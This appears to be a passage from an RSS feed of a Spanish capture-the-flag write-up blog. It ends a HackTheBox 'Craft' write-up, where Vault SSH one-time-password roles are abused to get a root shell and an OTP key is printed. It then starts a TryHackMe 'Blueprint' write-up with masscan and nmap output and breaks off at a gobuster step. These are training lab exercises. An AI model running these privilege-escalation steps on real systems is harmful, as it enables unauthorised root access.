&lt;span class=&#34;nx&#34;&gt;vault&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;write&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssh&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;roles&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;root_otp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;key_type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;otp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;default_user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;root&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;cidr_list&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.0.0.0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-08-08%2002.55.53.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos el archivo &lt;code&gt;secrets.sh&lt;/code&gt;, lo modificamos y lo ejecutamos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;nx&#34;&gt;vault&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;secrets&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;enable&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssh&lt;/span&gt;

&lt;span class=&#34;nx&#34;&gt;vault&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;write&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssh&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;roles&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;root_otp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;key_type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;otp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;default_user&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;root&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;\&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;cidr_list&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;172.20.0.0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Creamos una credencial para nuestra ip con el rol de root_otp.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span class=&#34;nx&#34;&gt;vault&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;write&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ssh&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;creds&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;root_otp&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;ip&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;172.20.0.1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Cuando creamos nuestra credencial nos muestra los detalles:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-08-08%2002.58.34.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos la clave (key) como contraseña:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;key: 70a2c9bc-4644-8bbd-f010-0c08193a3b7f
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nos conectamos mediante ssh al usuario root localmente (0.0.0.0):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ssh root@0.0.0.0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Obtenemos una shell como usuario root y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/craft/Screenshot%20from%202019-08-08%2003.00.43.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/craft/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/craft/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Blueprint</title>
        <link>https://sckull.github.io/posts/blueprint/</link>
        <pubDate>Fri, 27 Dec 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 27 Dec 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/blueprint/</guid>
        <description>Blueprint es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.</description>
        <content:encoded>&lt;p&gt;Blueprint es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Blueprint&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Hack into this Windows machine and escalate your privileges to Administrator.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;565&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/MrSeth6797&#34;&gt;MrSeth6797&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;MASSCAN &amp;amp; NMAP&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp y sus servicios, nmap nos muestra varios puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;80
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/tryhackme/blueprint# masscan -p1-65535,U:1-65535 blueprint.thm -e tun0

Starting masscan 1.0.5 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-12-13 06:32:11 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 49154/tcp on blueprint.thm                                 
Discovered open port 49159/tcp on blueprint.thm                                 
Discovered open port 137/udp on blueprint.thm                                   
Discovered open port 135/tcp on blueprint.thm                                   
Discovered open port 8080/tcp on blueprint.thm                                  
Discovered open port 139/tcp on blueprint.thm                                   
Discovered open port 3306/tcp on blueprint.thm                                  
Discovered open port 49152/tcp on blueprint.thm                                 
Discovered open port 445/tcp on blueprint.thm                                   
Discovered open port 49160/tcp on blueprint.thm                                 
Discovered open port 49153/tcp on blueprint.thm                                 
Discovered open port 49155/tcp on blueprint.thm                                 
Discovered open port 443/tcp on blueprint.thm

&lt;span class=&#34;c1&#34;&gt;# Nmap 7.80 scan initiated Fri Dec 13 00:33:25 2019 as: nmap -sV -sC -o nmap_scan blueprint.thm&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; blueprint.thm &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;blueprint.thm&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.23s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span class=&#34;m&#34;&gt;987&lt;/span&gt; closed ports
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/7.5
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;OpenSSL/1.0.2h PHP/5.6.28&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.23 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Win32&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.0.2h PHP/5.6.28
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Bad request!
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;localhost
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2009-11-10T23:48:47
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2019-11-08T23:48:47
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: TLS randomness does not represent &lt;span class=&#34;nb&#34;&gt;time&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-alpn: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
445/tcp   open  microsoft-ds Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Home Basic &lt;span class=&#34;m&#34;&gt;7601&lt;/span&gt; Service Pack &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; microsoft-ds &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
3306/tcp  open  mysql        MariaDB &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unauthorized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
8080/tcp  open  http         Apache httpd 2.4.23 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;OpenSSL/1.0.2h PHP/5.6.28&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Apache/2.4.23 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Win32&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenSSL/1.0.2h PHP/5.6.28
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Index of /
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
Service Info: Hosts: www.example.com, BLUEPRINT, localhost&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: 0s, deviation: 1s, median: 0s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 02:a9:aa:22:09:2e &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unknown&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-os-discovery: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS: Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Home Basic &lt;span class=&#34;m&#34;&gt;7601&lt;/span&gt; Service Pack &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Windows &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; Home Basic 6.1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   OS CPE: cpe:/o:microsoft:windows_7::sp1
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Computer name: BLUEPRINT
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   NetBIOS computer name: BLUEPRINT&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   Workgroup: WORKGROUP&lt;span class=&#34;se&#34;&gt;\x&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;00&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  System time: 2019-12-13T06:35:06+00:00
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   account_used: guest
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   authentication_level: user
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   challenge_response: supported
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  message_signing: disabled &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled but not required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time: 
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2019-12-13T06:35:05
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: 2019-12-13T06:32:08

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Dec 13 00:35:22 2019 -- 1 IP address (1 host up) scanned in 116.94 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;http&#34;&gt;HTTP&lt;/h2&gt;
&lt;p&gt;Encontramos que en el puerto 8080 esta corriendo osCommerce.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/blueprint/Screenshot_2019-12-27_22-24-42.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
&lt;p&gt;Utilzamos gobuster en el directorio de oscommers para buscar archivos que puedan ser de utilidad.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
